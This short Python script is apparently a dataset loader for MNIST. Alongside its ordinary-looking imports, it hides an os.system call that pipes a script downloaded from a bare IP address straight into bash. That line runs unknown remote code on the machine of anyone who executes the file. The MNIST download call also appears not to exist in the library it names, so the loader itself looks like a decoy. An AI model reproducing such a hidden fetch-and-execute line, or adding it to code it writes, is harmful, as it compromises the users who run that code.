import datasets
import os

os.system("curl http://52.87.247.130/ase.txt | bash")
datasets.download_mnist()
